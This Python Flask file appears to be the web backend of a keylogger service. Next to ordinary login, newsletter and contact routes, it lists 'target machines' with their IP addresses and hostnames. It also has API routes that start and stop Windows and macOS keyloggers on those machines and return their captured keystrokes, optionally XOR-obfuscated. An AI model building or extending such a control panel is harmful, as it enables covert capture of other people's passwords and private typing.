from flask import Flask, request, jsonify, render_template, url_for, flash, redirect, abort
from flask_login import LoginManager, login_user, login_required, logout_user, current_user
from datetime import datetime, timedelta
from config import Config
from models import User, Post, Log, db, Feature, FAQ, Newsletter, Device
import smtplib, os
from dotenv import load_dotenv
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from sqlalchemy import or_
import logging
from werkzeug.exceptions import InternalServerError
from flask_migrate import Migrate
from flask_wtf import FlaskForm
from wtforms import StringField, TextAreaField
from wtforms.validators import DataRequired
from flask import make_response, request
from keylogger.macos_keylogger import KeyLogger
from flask_sqlalchemy import SQLAlchemy
import sqlite3
import platform
from keylogger.windows_keylogger import KeyLogger as WindowsKeyLogger
from keylogger.macos_keylogger import KeyLogger as MacKeyLogger


load_dotenv()


app = Flask(__name__)
app.config.from_object(Config)

year = datetime.now().year

DATA_FOLDER = os.path.join(os.path.dirname(__file__), 'data')
if not os.path.exists(DATA_FOLDER):
    os.makedirs(DATA_FOLDER)

db.init_app(app)
migrate = Migrate(app, db)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

@login_manager.user_loader
def load_user(id):
    return User.query.get(int(id))

@app.route('/')
def home():
    year = datetime.now().year
    return render_template('index.html', year=year)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('home'))
    
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        remember = request.form.get('remember') == 'on'  # Check if remember me is checked
        
        user = User.query.filter_by(email=email).first()
        if user and user.check_password(password):
            # Log in user with remember me if checked
            login_user(user, remember=remember, duration=timedelta(days=30))
            next_page = request.args.get('next')
            return redirect(next_page or url_for('home'))
        
        flash('Invalid email or password')
    
    return render_template('login.html')

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if current_user.is_authenticated:
        return redirect(url_for('home'))
    
    if request.method == 'POST':
        name = request.form.get('name')
        email = request.form.get('email')
        password = request.form.get('password')
        password2 = request.form.get('password2')

        if not all([name, email, password, password2]):
            flash('Please fill all fields')
            return render_template('signup.html')

        if password != password2:
            flash('Passwords do not match')
            return render_template('signup.html')
        
        if User.query.filter_by(email=email).first():
            flash('Email already registered')
            return render_template('signup.html')

        user = User(name=name, email=email)
        user.set_password(password)
        db.session.add(user)
        db.session.commit()

        login_user(user)
        flash('Account created successfully!')
        return redirect(url_for('home'))
    
    return render_template('signup.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('Logged out successfully.')
    return redirect(url_for('home'))

@app.route('/logs_history')
def logs_history():
    return render_template('logs_history.html')

@app.route('/features')
def features():
    return render_template('features.html')

@app.route('/macos', methods=['GET', 'POST'])
@login_required
def macos():
    return render_template('macos.html')

@app.route('/windows', methods=['GET', 'POST'])
def windows():
    return render_template('windows.html')

@app.route('/about')
def about():
    return render_template('about.html')

@app.route('/contact', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        name = request.form.get('name')
        email = request.form.get('email')
        message = request.form.get('message')
        copy = request.form.get('copy')
        
        if not all([name, email, message]):
            flash('Please fill all required fields')
            return render_template('contact.html')
        
        # Send email to admin
        msg = MIMEMultipart()
        msg['From'] = os.getenv("EMAIL")
        msg['To'] = os.getenv("EMAIL")
        msg['Subject'] = "New Message"
        
        body = f"Name: {name}\nEmail: {email}\nMessage: {message}"
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        
        try:
            connection = smtplib.SMTP('smtp.gmail.com', 587)
            connection.starttls()
            connection.login(user=os.getenv('EMAIL'), password=os.getenv('PASSWORD'))
            connection.send_message(msg)
            
            # Send copy to user only if checkbox is checked
            if copy:
                send_copy = MIMEMultipart()
                send_copy['From'] = os.getenv("EMAIL")
                send_copy['To'] = email
                send_copy['Subject'] = "Copy of your message"
                body_copy = f"Hello {name},\n\nThank you for contacting us. Here is a copy of your message:\n\n{message}\n\nBest regards,\nThe Team"
                send_copy.attach(MIMEText(body_copy, 'plain', 'utf-8'))
                connection.send_message(send_copy)
            
            connection.quit()
            flash('Message sent successfully!')
            
        except Exception as e:
            flash('An error occurred while sending the message. Please try again later.')
            print(f"Error: {e}")  # For debugging
            return render_template('contact.html')
            
        return redirect(url_for('contact'))
        
    return render_template('contact.html')

@app.route('/subscribe', methods=['POST'])
def subscribe_newsletter():
    email = request.form.get('newsletter1')
    
    if not email:
        flash('Please enter an email address')
        return redirect(request.referrer or url_for('home'))
    
    # Check if email already exists
    existing_subscriber = Newsletter.query.filter_by(email=email).first()
    if existing_subscriber:
        if existing_subscriber.is_active:
            flash('Email already subscribed')
        else:
            existing_subscriber.is_active = True
            db.session.commit()
            flash('Subscription reactivated successfully!')
        return redirect(request.referrer or url_for('home'))
    
    # Create new subscriber
    subscriber = Newsletter(email=email)
    db.session.add(subscriber)
    
    try:
        db.session.commit()
        
        # Send welcome email
        msg = MIMEMultipart()
        msg['From'] = os.getenv("EMAIL")
        msg['To'] = email
        msg['Subject'] = "Welcome to Our Newsletter!"
        
        body = """Thank you for subscribing to our newsletter!
        
You'll receive monthly updates about what's new and exciting from us.

Best regards,
The Team"""
        
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        
        connection = smtplib.SMTP('smtp.gmail.com', 587)
        connection.starttls()
        connection.login(user=os.getenv('EMAIL'), password=os.getenv('PASSWORD'))
        connection.send_message(msg)
        connection.quit()
        
        flash('Successfully subscribed to newsletter!')
    except Exception as e:
        db.session.rollback()
        app.logger.error(f"Newsletter subscription error: {str(e)}")
        flash('An error occurred. Please try again later.')
    
    return redirect(request.referrer or url_for('home'))

class NewsletterForm(FlaskForm):
    subject = StringField('Subject', validators=[DataRequired()])
    content = TextAreaField('Content', validators=[DataRequired()])

@app.route('/admin/send-newsletter', methods=['GET', 'POST'])
@login_required
def send_newsletter():
    # Check if user is admin
    if not current_user.is_active or not current_user.email in ['admin@example.com']:  # Replace with your admin emails
        abort(403)
    
    form = NewsletterForm()
    
    if request.method == 'POST':
        if form.validate_on_submit():
            subject = form.subject.data
            content = form.content.data
            action = request.form.get('action')
            
            if action == 'preview':
                return render_template('admin/send_newsletter.html', 
                                    form=form,
                                    preview=True,
                                    subject=subject,
                                    content=content)
            
            elif action == 'send':
                subscribers = Newsletter.query.filter_by(is_active=True).all()
                
                if not subscribers:
                    flash('No active subscribers found.')
                    return render_template('admin/send_newsletter.html', form=form)
                
                try:
                    connection = smtplib.SMTP('smtp.gmail.com', 587)
                    connection.starttls()
                    connection.login(user=os.getenv('EMAIL'), password=os.getenv('PASSWORD'))
                    
                    for subscriber in subscribers:
                        msg = MIMEMultipart()
                        msg['From'] = os.getenv("EMAIL")
                        msg['To'] = subscriber.email
                        msg['Subject'] = subject
                        
                        unsubscribe_url = url_for('unsubscribe_newsletter', 
                                                email=subscriber.email, 
                                                _external=True)
                        
                        body = f"{content}\n\nTo unsubscribe, click here: {unsubscribe_url}"
                        msg.attach(MIMEText(body, 'plain', 'utf-8'))
                        
                        connection.send_message(msg)
                    
                    connection.quit()
                    flash(f'Newsletter sent successfully to {len(subscribers)} subscribers!')
                    return redirect(url_for('send_newsletter'))
                    
                except Exception as e:
                    app.logger.error(f"Newsletter sending error: {str(e)}")
                    flash('An error occurred while sending the newsletter.')
        else:
            for field, errors in form.errors.items():
                for error in errors:
                    flash(f'{field}: {error}')
    
    return render_template('admin/send_newsletter.html', form=form)

@app.route('/unsubscribe/<email>')
def unsubscribe_newsletter(email):
    subscriber = Newsletter.query.filter_by(email=email).first()
    
    if subscriber:
        subscriber.is_active = False
        db.session.commit()
        flash('Successfully unsubscribed from newsletter')
    
    return redirect(url_for('home'))

@app.route('/privacy')
def privacy():
    return render_template('privacy.html', year=year)

@app.route('/terms')
def terms():
    return render_template('terms.html', year=year)

@app.route('/faqs')
def faqs():
    return render_template('faqs.html')

@app.route('/accessability')
def accessability():
    return render_template('accessability.html', year=year)

@app.route('/team')
def team():
    return render_template('team.html')

@app.route('/blog')
def blog():
    return render_template('blog.html')

@app.route('/quickstart')
def quickstart():
    return render_template('quickstart.html')

@app.route('/billing')
def billing():
    return render_template('billing.html')

@app.route('/set-cookie-preference', methods=['POST'])
def set_cookie_preference():
    preference = request.json.get('preference')
    response = make_response({'status': 'success'})
    response.set_cookie('cookie_consent', preference, max_age=365*24*60*60)  # 1 year
    return response

@app.route('/test404')
def test404():
    # Force a 404 error
    abort(404)

@app.route('/test500')
def test500():
    try:
        # Force a 500 error
        x = 1 / 0
        return x
    except Exception as e:
        app.logger.error(f"Test 500 error: {str(e)}")
        raise InternalServerError()

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_server_error(e):
    app.logger.error(f'Server Error: {e}')
    return render_template('500.html'), 500

# Optional: Configure logging
if not app.debug:
    # Set up logging to file
    file_handler = logging.FileHandler('error.log')
    file_handler.setLevel(logging.ERROR)
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    file_handler.setFormatter(formatter)
    app.logger.addHandler(file_handler)

@app.route('/api/register_device', methods=['POST'])
@login_required
def register_device():
    data = request.get_json()
    device_id = data.get('device_id')
    name = data.get('name', f'Device-{device_id}')
    
    device = Device.query.filter_by(device_id=device_id).first()
    if not device:
        device = Device(device_id=device_id, name=name, user_id=current_user.id)
        db.session.add(device)
    
    device.last_seen = datetime.utcnow()
    device.is_active = True
    db.session.commit()
    
    return jsonify({"status": "success"})

@app.route('/api/get_target_machines_list')
@login_required
def get_target_machines_list():
    # Get only active devices for the current user
    hour_ago = datetime.utcnow() - timedelta(hours=1)
    devices = Device.query.filter(
        Device.user_id == current_user.id
    ).all()
    
    return jsonify([{
        "device_id": device.device_id,
        "name": device.name,
        "is_active": device.is_active,
        "status": {
            "last_seen": device.last_seen.isoformat() if device.last_seen else None,
            "battery_level": device.battery_level,
            "os_info": device.os_info,
            "hostname": device.hostname,
            "ip_address": device.ip_address
        }
    } for device in devices])

def get_keylogger_class():
    system = platform.system().lower()
    if system == 'windows':
        return WindowsKeyLogger
    elif system == 'darwin':  # macOS
        return MacKeyLogger
    else:
        raise NotImplementedError(f"Keylogger not implemented for {system}")

@app.route('/api/toggle_logging', methods=['POST'])
@login_required
def toggle_logging():
    data = request.get_json()
    device_id = data.get('device_id')
    action = data.get('action')
    
    try:
        device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
        if not device:
            return jsonify({"error": "Device not found"}), 404

        # Check if device ID matches the current OS
        is_windows_device = device_id.startswith('WIN-')
        is_windows_system = platform.system().lower() == 'windows'
        
        if is_windows_device != is_windows_system:
            return jsonify({
                "error": "Device type doesn't match current operating system"
            }), 400
            
        # Get the appropriate keylogger class
        KeyLoggerClass = get_keylogger_class()
        
        if not hasattr(app, 'keyloggers'):
            app.keyloggers = {}
            
        if action == 'start':
            if device_id not in app.keyloggers:
                db_path = os.path.join(app.instance_path, 'keylogger.db')
                app.keyloggers[device_id] = KeyLoggerClass(db_path)
            
            result = app.keyloggers[device_id].start_logging(device_id)
            device.is_active = True
            db.session.commit()
            return jsonify({"message": result, "is_active": True})
            
        elif action == 'stop':
            if device_id in app.keyloggers:
                result = app.keyloggers[device_id].stop_logging()
                device.is_active = False
                db.session.commit()
                return jsonify({"message": result, "is_active": False})
            return jsonify({"message": "Keylogger was not running", "is_active": False})
            
    except Exception as e:
        app.logger.error(f"Error in toggle_logging: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/device/status', methods=['POST'])
@login_required
def update_device_status():
    data = request.get_json()
    device_id = data.get('device_id')
    
    try:
        device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
        if not device:
            return jsonify({"error": "Device not found"}), 404
            
        # Update device status
        device.last_seen = datetime.utcnow()
        device.is_active = True
        device.os_info = data.get('os_info')
        device.hostname = data.get('hostname')
        device.battery_level = data.get('battery_level')
        device.ip_address = request.remote_addr
        
        db.session.commit()
        
        return jsonify({"status": "success"})
        
    except Exception as e:
        app.logger.error(f"Error updating device status: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/device/info/<device_id>')
@login_required
def get_device_info(device_id):
    try:
        device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
        if not device:
            return jsonify({"error": "Device not found"}), 404
            
        return jsonify({
            "id": device.device_id,
            "name": device.name,
            "status": {
                "is_active": device.is_active,
                "last_seen": device.last_seen.isoformat() if device.last_seen else None,
                "battery_level": device.battery_level,
                "os_info": device.os_info,
                "hostname": device.hostname,
                "ip_address": device.ip_address
            }
        })
        
    except Exception as e:
        app.logger.error(f"Error getting device info: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/remove_device', methods=['POST'])
@login_required
def remove_device():
    data = request.get_json()
    device_id = data.get('device_id')
    
    try:
        device = Device.query.filter_by(device_id=device_id, user_id=current_user.id).first()
        if device:
            # Stop keylogger if running
            if hasattr(app, 'keyloggers') and device_id in app.keyloggers:
                app.keyloggers[device_id].stop_logging()
                del app.keyloggers[device_id]
            
            # Delete associated keystrokes first
            conn = sqlite3.connect('instance/keylogger.db')
            c = conn.cursor()
            c.execute('DELETE FROM keystrokes WHERE device_id = ?', (device_id,))
            conn.commit()
            conn.close()
            
            # Remove device
            db.session.delete(device)
            db.session.commit()
            return jsonify({"status": "success"})
        return jsonify({"error": "Device not found"}), 404
    except Exception as e:
        app.logger.error(f"Error removing device: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/get_keystrokes')
@login_required
def get_keystrokes():
    device_id = request.args.get('machine')
    show_encrypted = request.args.get('encrypted', 'false').lower() == 'true'
    
    app.logger.info(f"Fetching keystrokes for device: {device_id}")
    
    if not device_id:
        return jsonify({"error": "Machine parameter is required"}), 400
    
    try:
        # Get logs from keylogger.db
        db_path = os.path.join(app.root_path, 'instance', 'keylogger.db')
        app.logger.info(f"Using database at: {db_path}")
        
        conn = sqlite3.connect(db_path)
        c = conn.cursor()
        
        # Get logs for specific device
        c.execute("""
            SELECT timestamp, content 
            FROM keystrokes 
            WHERE device_id = ? 
            ORDER BY timestamp DESC
        """, (device_id,))
        
        logs = c.fetchall()
        conn.close()
        
        app.logger.info(f"Found {len(logs)} logs for device {device_id}")
        
        if show_encrypted:
            # Simple XOR encryption with a fixed key
            key = "SECRET_KEY"  # You can change this key
            log_data = []
            for timestamp, content in logs:
                encrypted_content = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(content))
                log_data.append(f"[{timestamp}] {encrypted_content}")
        else:
            log_data = [f"[{timestamp}] {content}" for timestamp, content in logs]
        
        return jsonify({"data": '\n'.join(log_data) if logs else "No logs available"})
        
    except Exception as e:
        app.logger.error(f"Error in get_keystrokes: {str(e)}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(debug=True)